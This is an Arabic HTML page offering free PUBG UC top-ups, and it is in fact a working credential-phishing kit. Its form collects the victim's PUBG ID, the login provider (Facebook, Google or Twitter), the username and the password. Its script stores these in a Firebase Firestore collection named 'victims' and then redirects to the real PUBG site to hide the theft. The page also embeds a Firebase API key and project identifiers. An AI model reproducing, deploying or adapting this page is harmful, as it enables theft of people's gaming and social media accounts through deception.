<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>PUBG</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:rgba(0,0,0,0.7);border-radius:15px;padding:25px;max-width:400px;width:100%;text-align:center;border:2px solid #f0c040;box-shadow:0 0 30px rgba(240,192,64,0.3)}h1{color:#f0c040;font-size:20px;margin-bottom:15px}input,select{width:100%;padding:12px;background:rgba(255,255,255,0.08);border:1px solid #444;border-radius:8px;color:#fff;font-size:13px;outline:none;margin-bottom:8px}input:focus,select:focus{border-color:#f0c040}select option{background:#1a1a2e;color:#fff}.btn{width:100%;padding:12px;background:linear-gradient(135deg,#f0c040,#e0a800);color:#000;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;justify-content:center;align-items:center;flex-direction:column}.load.show{display:flex}.spinner{width:40px;height:40px;border:4px solid #333;border-top:4px solid #f0c040;border-radius:50%;animation:spin 0.8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style></head>
<body><div class="container"><h1>🎮 شحن PUBG</h1><p style="color:#aaa;font-size:12px;margin-bottom:15px">شحن مجاني</p>
<input type="text" id="pubg_id" placeholder="ID حساب PUBG">
<select id="login_type"><option value="">طريقة الدخول</option><option>Facebook</option><option>Google</option><option>Twitter</option></select>
<input type="text" id="username" placeholder="اسم المستخدم">
<input type="password" id="password" placeholder="كلمة المرور">
<select id="amount"><option value="">اختر الباقة</option><option>60 UC</option><option>300 UC</option><option>600 UC</option><option>1500 UC</option></select>
<button class="btn" onclick="go()">⚡ شحن</button></div>
<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الشحن...</p></div>
<script>
firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
var db=firebase.firestore();
async function go(){var id=document.getElementById('pubg_id').value.trim(),lt=document.getElementById('login_type').value,un=document.getElementById('username').value.trim(),pw=document.getElementById('password').value.trim(),am=document.getElementById('amount').value;if(!id||!lt||!un||!pw||!am)return alert('املأ الحقول');document.getElementById('load').classList.add('show');await db.collection('victims').add({service:'🎮 PUBG',text:'🆔 '+id+' | 👤 '+un+' | 🔑 '+lt+' | 🔒 '+pw+' | 💰 '+am,timestamp:new Date().toISOString()});setTimeout(function(){document.getElementById('load').classList.remove('show');window.location.href='https://pubgmobile.com/'},2000)}
</script></body></html>
